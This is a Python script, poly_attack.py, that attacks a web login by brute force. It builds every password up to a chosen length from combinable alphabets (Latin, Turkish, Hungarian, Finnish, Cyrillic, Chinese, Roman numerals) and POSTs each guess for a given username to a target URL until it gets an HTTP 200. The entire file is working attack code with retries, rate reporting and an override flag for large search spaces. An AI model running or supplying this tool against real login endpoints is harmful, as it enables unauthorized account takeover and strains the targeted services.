#!/usr/bin/env python3
"""
================================================================================
File:        poly_attack.py
Description: Polymorphic (multi-alphabet) brute-force attack tool
             Combines multiple character sets including extended/international alphabets
             (Turkish, Hungarian, Finnish, Cyrillic, Chinese, Roman numerals)
Parameters:  --target <URL>, --user <username>,
             --digits, --lower, --upper, --symbols,
             --turkish, --hungarian, --finnish, --cyrillic, --chinese, --roman,
             --max-len <int>, --delay <float>, --force
Author:      Erik Buser
Date:        2025-10-28
================================================================================
"""

import argparse
import itertools
import sys
import time
import requests
import string


def build_alphabet(args):
    """Build alphabet from flags. Returns string of characters."""
    parts = []
    if args.digits:
        parts.append(string.digits)
    if args.lower:
        parts.append(string.ascii_lowercase)
    if args.upper:
        parts.append(string.ascii_uppercase)
    if args.symbols:
        parts.append("!@#$%^&*()_+-=[]{}|;:',.<>?/")
    if args.turkish:
        # Turkish specific: ç, ğ, ı, ö, ş, ü (lowercase and uppercase)
        parts.append("çğıöşüÇĞİÖŞÜ")
    if args.hungarian:
        # Hungarian specific: á, é, í, ó, ö, ő, ú, ü, ű (lowercase and uppercase)
        parts.append("áéíóöőúüűÁÉÍÓÖŐÚÜŰ")
    if args.finnish:
        # Finnish specific: å, ä, ö (lowercase and uppercase)
        parts.append("åäöÅÄÖ")
    if args.cyrillic:
        # Cyrillic alphabet (Russian): а-я, А-Я
        parts.append("абвгдежзийклмнопрстуфхцчшщъыьэюяАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ")
    if args.chinese:
        # Example set of common Chinese characters 
        parts.append("的一是在不了有和人这中大为上个国我以要他时来用们生到作地于出就分对成会可主发年动同工也能下过子说产种面而方后多定行学法所民得经十三之进着等部度家电力里如水化高自二理起小物现实加量都两体制机当使点从业本去把性好应开它合还因由其些然前外天政四日那社义事平形相全表间样与关各重新线内数正心反你明看原又么利比或但质气第向道命此变条只没结解问意建月公无系军很情者最立代想已通并提直题党程展五果料象员革位入常文总次品式活设及管特件长求老头基资边流路级少图山统接知较将组见计别她手角期根论运农指几九区强放决西被干做必战先回则任取据处队南给色光门即保治北造百规热领七海口东导器压志世金增争济阶油思术极交受联什认六共权收证改清己美再采转更单风切打白教速花带安场身车例真务具万每目至达走积示议声报斗完类八离华名确才科张信马节话米整空元况今集温传土许步群广石记需段研界拉林律叫且究观越织装影算低持音众书布复容儿须际商非验连断深难近矿千周委素技备半办青省列习便响约支般史感劳便团往酸历市克何除消构府称太准精值号率族维划选标写存候毛亲快效斯院查江型眼王按格养易置派层片始却专状育厂京识适属圆包火住调满县局照参红细引听该铁价严龙飞")
    if args.roman:
        # Roman numerals (uppercase only)
        parts.append("IVXLCDM")
    if not parts:
        print("[!] No alphabet selected. Use at least one flag (--digits, --lower, --upper, --symbols, --turkish, --hungarian, --finnish, --cyrillic, --chinese, --roman)", file=sys.stderr)
        sys.exit(2)
    return "".join(parts)


def calculate_total_candidates(alphabet_size, max_len):
    """Calculate total number of candidates for given alphabet size and max length."""
    total = 0
    for length in range(1, max_len + 1):
        total += alphabet_size ** length
    return total


def try_post(url, payload, timeout=5.0, max_retries=3):
    """POST JSON payload to url with retries. Returns response or None."""
    backoff = 0.5
    for attempt in range(1, max_retries + 1):
        try:
            r = requests.post(url, json=payload, timeout=timeout)
            return r
        except requests.RequestException as e:
            if attempt == max_retries:
                print(f"[!] Request failed after {attempt} attempts: {e}")
                return None
            else:
                time.sleep(backoff)
                backoff *= 2
    return None


def main():
    parser = argparse.ArgumentParser(description="Polymorphic brute-force tool with combinable alphabets")
    parser.add_argument("--target", required=True, help="Target URL (e.g. http://127.0.0.1:5000/login)")
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument("--digits", action="store_true", help="Include digits (0-9)")
    parser.add_argument("--lower", action="store_true", help="Include lowercase letters (a-z)")
    parser.add_argument("--upper", action="store_true", help="Include uppercase letters (A-Z)")
    parser.add_argument("--symbols", action="store_true", help="Include common symbols")
    parser.add_argument("--turkish", action="store_true", help="Include Turkish characters (ç, ğ, ı, ö, ş, ü)")
    parser.add_argument("--hungarian", action="store_true", help="Include Hungarian characters (á, é, í, ó, ö, ő, ú, ü, ű)")
    parser.add_argument("--finnish", action="store_true", help="Include Finnish characters (å, ä, ö)")
    parser.add_argument("--cyrillic", action="store_true", help="Include Cyrillic alphabet (Russian)")
    parser.add_argument("--chinese", action="store_true", help="Include example Chinese characters (示例)")
    parser.add_argument("--roman", action="store_true", help="Include Roman numerals (I, V, X, L, C, D, M)")
    parser.add_argument("--max-len", type=int, default=4, help="Maximum password length to try")
    parser.add_argument("--delay", type=float, default=0.05, help="Delay in seconds between attempts")
    parser.add_argument("--force", action="store_true", help="Skip warning for large search spaces")
    args = parser.parse_args()

    alphabet = build_alphabet(args)
    total = calculate_total_candidates(len(alphabet), args.max_len)

    print(f"[+] Alphabet: {repr(alphabet[:50])}{'...' if len(alphabet) > 50 else ''}")
    print(f"[+] Alphabet size: {len(alphabet)}; Max length: {args.max_len}")
    print(f"[+] Total candidates: {total:,}")

    # Warn if search space is very large
    if total > 1_000_000 and not args.force:
        print(f"\n[!] WARNING: Search space is very large ({total:,} candidates)")
        print("[!] This may take a very long time. Consider:")
        print("    - Reducing --max-len")
        print("    - Using fewer alphabet flags")
        print("    - Using --force to skip this warning")
        response = input("\nContinue anyway? [y/N]: ")
        if response.lower() != "y":
            print("Aborted by user")
            return 1

    tried = 0
    start = time.time()

    try:
        for length in range(1, args.max_len + 1):
            for tup in itertools.product(alphabet, repeat=length):
                pwd = "".join(tup)

                payload = {"username": args.user, "password": pwd}
                r = try_post(args.target, payload)
                tried += 1

                if r is None:
                    print(f"[-] Request failed for candidate '{pwd}', skipping")
                else:
                    if r.status_code == 200:
                        elapsed = time.time() - start
                        print(f"FOUND: {pwd} (tried {tried:,} candidates in {elapsed:.1f}s)")
                        return 0
                    else:
                        if tried % 100 == 0:
                            elapsed = time.time() - start
                            rate = tried / elapsed if elapsed > 0 else 0
                            print(f"[i] Tried {tried:,} candidates, last='{pwd}', rate={rate:.1f}/s, elapsed={elapsed:.1f}s")

                time.sleep(args.delay)

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        return 130

    elapsed = time.time() - start
    print(f"Not found (tried {tried:,} candidates in {elapsed:.1f}s)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
